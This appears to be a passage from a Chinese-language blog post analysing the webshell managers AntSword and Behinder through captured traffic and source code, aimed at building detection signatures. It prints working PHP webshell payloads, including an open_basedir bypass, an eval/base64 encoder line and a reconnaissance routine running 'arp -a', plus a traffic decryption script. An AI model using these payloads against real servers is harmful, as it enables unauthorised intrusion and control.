class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
<p>通过多抓几次包可以发现，基本上代码的主体框架，或者说是特征是一样的，最显眼的便是下面两句话</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>想要分析出 AntSword 的所有行为，通过抓包逐一分析是复杂的，但是有了对
AntSword 的基本认识，就可以来分析 AntSword 的代码了。</p>
<h3 id="主逻辑">主逻辑</h3>
<p>AntSword 的代码十分浅显，不难发现重点在于 <code>core</code>
库中编写的代码，其中包含所支持的所有<strong>连接类型</strong>。</p>
<blockquote>
<p>连接类型是 AntSword
的一个术语，可以理解为使用什么语言的代码来解析不同的行为。</p>
</blockquote>
<p>在文件夹 <code>core/php</code> 下有三个文件夹
<code>encoder</code>，<code>decoder</code> 和
<code>template</code>，分别对应的是编码器、解码器和命令执行代码；还有一个入口文件
<code>index.js</code>。</p>
<p>首先分析 <code>index.js</code>，观察到 119 行
<code>data['_'] = ...</code>，这是最终返回的负载形式，格式化代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">$&#123;bypassOpenBaseDirCode&#125;;</span><br><span class="line">$&#123;asencCode&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$&#123;tag_s . substr(0, tag_s . length / 2)&#125;&quot;</span> . <span class="string">&quot;$&#123;tag_s . substr(tag_s . length / 2)&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;$&#123;tag_e . substr(0, tag_e . length / 2)&#125;&quot;</span> . <span class="string">&quot;$&#123;tag_e . substr(tag_e . length / 2)&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $&#123;tmpCode&#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
<p>与上文抓包进行比对，可以发现基本一致。</p>
<p>向代码上文进行匹配
<code>bypassOpenBaseDirCode</code>，不难发现也是固定的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.$&#123;opdir&#125;&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">        <span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\\\\\|\\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>再向上文匹配 <code>asencCode</code>，可以找到目标代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!force_default) &#123;</span><br><span class="line">    asencCode = <span class="variable language_">this</span>.<span class="property">__decoder__</span>[<span class="variable language_">this</span>.<span class="property">__opts__</span>[<span class="string">&#x27;decoder&#x27;</span>] || <span class="string">&#x27;default&#x27;</span>].<span class="title function_">asoutput</span>(ext);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    asencCode = <span class="variable language_">this</span>.<span class="property">__decoder__</span>[<span class="string">&#x27;default&#x27;</span>].<span class="title function_">asoutput</span>(ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得知这与<strong>解码器</strong>（decoder）的设置有关系。</p>
<p>最终用于执行指定命令的代码是 <code>tmpCode</code>，可以找到代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tmpCode = data[<span class="string">&#x27;_&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>而 <code>data</code> 可以通过注释猜测为 <code>template</code>
中的代码，比如说查看
<code>template/base.js</code>，可以发现其中一部分代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">info</span>: &#123;</span><br><span class="line">    <span class="attr">_</span>: <span class="string">`$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span></span><br><span class="line"><span class="string">    if($D==&quot;&quot;)</span></span><br><span class="line"><span class="string">      $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span></span><br><span class="line"><span class="string">    $R=&quot;&#123;$D&#125;\t&quot;;</span></span><br><span class="line"><span class="string">    if(substr($D,0,1)!=&quot;/&quot;)&#123;</span></span><br><span class="line"><span class="string">      foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)</span></span><br><span class="line"><span class="string">        if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">      $R.=&quot;/&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $R.=&quot;\t&quot;;</span></span><br><span class="line"><span class="string">    $u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;</span></span><br><span class="line"><span class="string">    $s=($u)?$u[&quot;name&quot;]:@get_current_user();</span></span><br><span class="line"><span class="string">    $R.=php_uname();</span></span><br><span class="line"><span class="string">    $R.=&quot;\t&#123;$s&#125;&quot;;</span></span><br><span class="line"><span class="string">    echo $R;`</span>.<span class="title function_">replace</span>(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与上文抓包得到的代码一致。</p>
<p>至此，AntSword
的主要逻辑便分析完成：<strong>将不同的命令使用不同的模板代码填充基本框架</strong>。</p>
<p>接下来就是两大 AntSword 核心功能：编码器与解码器</p>
<h3 id="编码器与解码器">编码器与解码器</h3>
<p>解码器相对于编码器较为简单，即主逻辑中的 <code>asencCode</code>
根据解码器的选择而改变，比如说 base64 的解码器功能即会使得输出函数为</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.<span class="title function_">replace</span>(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即使用 <code>base64_encode</code>
函数对输出进行编码，故还需要一个解码函数来解析输出向用户展示</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Buffer</span>.<span class="title function_">from</span>(buff.<span class="title function_">toString</span>(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以尝试抓包，会得到与默认输出不同的输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d10db/var/www/html	/	Linux aurora-vm-202 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64	www-data87ed9f4e2</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4192a127b3L3Zhci93d3cvaHRtbAkvCUxpbnV4IGF1cm9yYS12bS0yMDIgNS4xNS4wLTg5LWdlbmVyaWMgIzk5LVVidW50dSBTTVAgTW9uIE9jdCAzMCAyMDo0Mjo0MSBVVEMgMjAyMyB4ODZfNjQJd3d3LWRhdGE=52bd993e</span><br></pre></td></tr></table></figure>
<p>其中前后会出现一些干扰字符是因为 <code>asoutput</code>
函数，去除可以得到 Base64 字符串
<code>L3Zhci93d3cvaHRtbAkvCUxpbnV4IGF1cm9yYS12bS0yMDIgNS4xNS4wLTg5LWdlbmVyaWMgIzk5LVVidW50dSBTTVAgTW9uIE9jdCAzMCAyMDo0Mjo0MSBVVEMgMjAyMyB4ODZfNjQJd3d3LWRhdGE=</code>，解码后上下结果相同。</p>
<p>对于编码器，最好结合抓包示例分析，抓包结果如下（去除了过长的部分，实际上
Base64 解码后就是 <code>info</code> 代码）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d35f7a54ed3f61=...&amp;qsdzyyds=@eval(@base64_decode($_POST[&#x27;d35f7a54ed3f61&#x27;]));</span><br></pre></td></tr></table></figure>
<p>可以发现就是将传送的指令变为了 Base64 解码另一个参数，再结合
<code>encoder/base64.js</code> 的代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(pwd, data, ext = <span class="literal">null</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID;</span><br><span class="line">  <span class="keyword">if</span> (ext.<span class="property">opts</span>.<span class="property">otherConf</span>[<span class="string">&#x27;use-random-variable&#x27;</span>] === <span class="number">1</span>) &#123;</span><br><span class="line">    randomID = antSword.<span class="property">utils</span>.<span class="title class_">RandomChoice</span>(antSword[<span class="string">&#x27;RANDOMWORDS&#x27;</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    randomID = <span class="string">`<span class="subst">$&#123;antSword[<span class="string">&#x27;utils&#x27;</span>].RandomLowercase()&#125;</span><span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  data[randomID] = <span class="title class_">Buffer</span></span><br><span class="line">    .<span class="title function_">from</span>(data[<span class="string">&#x27;_&#x27;</span>])</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  data[pwd] = <span class="string">`@eval(@base64_decode($_POST[&#x27;<span class="subst">$&#123;randomID&#125;</span>&#x27;]));`</span>;</span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不难得知，实际上是随机生成一个新参数的名字，然后将 Base64
编码后的结果通过另一种方式传递。</p>
<p>至此，AntSword 两大核心功能也分析完毕。</p>
<p>对于其他连接类型下的代码分析方法一致，这里不再一一赘述。</p>
<h3 id="防御">防御</h3>
<p>为了便于分析或防御 AntSword
流量，可以通过一些特征入手，比如说匹配模板代码，或者说匹配框架代码。</p>
<h2 id="behinder">Behinder</h2>
<h3 id="抓包-1">抓包</h3>
<p>AntSword 的内容对于流量传输过程没有任何加密（这也是菜刀的功能），于是
AntSword 提供了 custom 连接类型，方便用户自定义流量加密。</p>
<p>Behinder 与 AntSword 有些不同，Behinder
天生就提供流量加密功能，需要用户写入加密、解密函数，生成服务端 WebShell
上传，才可以进行连接。</p>
<p>在 Behinder 的用语里，这叫做<strong>传输协议</strong>。</p>
<blockquote>
<p>当然也提供默认的服务端 WebShell，在 <code>server</code>
文件夹中，也有一些自定义协议可以直接生成默认服务端。</p>
</blockquote>
<p>这里使用默认的 default_xor_base64 传输协议，这是为了方便解析。</p>
<p>为了方便这里提供解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_default_xor_base64</span>(<span class="params">encrypt_content: <span class="built_in">str</span>, key: <span class="built_in">str</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span></span>):</span><br><span class="line">    xor_content = base64.b64decode(unquote(encrypt_content))</span><br><span class="line">    key = key[<span class="number">1</span>:] + key[:<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(xor_content, itertools.cycle(key.encode()))])</span><br></pre></td></tr></table></figure>
<p>解析后得到格式化后的代码如下（过长代码删去）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();  <span class="comment">//初始化session，避免connect之后直接background，后续getresult无法获取cookie</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    	<span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">	<span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&quot;...&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
<p>这里的 <code>content</code> 仅作测试，无实际含义。</p>
<p>在测试连接正常后，会发送第二次请求</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$whatever</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>(); <span class="title function_ invoke__">phpinfo</span>(); <span class="variable">$info</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="variable">$driveList</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(PHP_OS,<span class="string">&quot;windows&quot;</span>)||<span class="title function_ invoke__">stristr</span>(PHP_OS,<span class="string">&quot;winnt&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">65</span>;<span class="variable">$i</span>&lt;=<span class="number">90</span>;<span class="variable">$i</span>++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="variable">$drive</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;:/&#x27;</span>;</span><br><span class="line">    		<span class="title function_ invoke__">file_exists</span>(<span class="variable">$drive</span>) ? <span class="variable">$driveList</span>=<span class="variable">$driveList</span>.<span class="variable">$drive</span>.<span class="string">&quot;;&quot;</span>:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$driveList</span>=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$currentPath</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">    <span class="comment">//echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;</span></span><br><span class="line">    <span class="variable">$osInfo</span>=PHP_OS;</span><br><span class="line">    <span class="variable">$arch</span>=<span class="string">&quot;64&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="variable">$arch</span> = <span class="string">&quot;32&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$localIp</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="title function_ invoke__">gethostname</span>());</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$localIp</span>!=<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$localIp</span>=<span class="variable">$localIp</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$extraIps</span>=<span class="title function_ invoke__">getInnerIP</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$extraIps</span> <span class="keyword">as</span> <span class="variable">$ip</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$localIp</span>,<span class="variable">$ip</span>)===<span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="variable">$localIp</span>=<span class="variable">$localIp</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$basicInfoObj</span>=<span class="keyword">array</span>(<span class="string">&quot;basicInfo&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$info</span>),<span class="string">&quot;driveList&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$driveList</span>),<span class="string">&quot;currentPath&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$currentPath</span>),<span class="string">&quot;osInfo&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$osInfo</span>),<span class="string">&quot;arch&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arch</span>),<span class="string">&quot;localIp&quot;</span>=&gt;<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$localIp</span>));</span><br><span class="line">    <span class="comment">//echo json_encode($result);</span></span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$basicInfoObj</span>));</span><br><span class="line">    <span class="comment">//echo json_encode($result);</span></span><br><span class="line">    <span class="comment">//echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getInnerIP</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="string">&quot;exec&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;arp -a&#x27;</span>,<span class="variable">$sa</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sa</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line"> 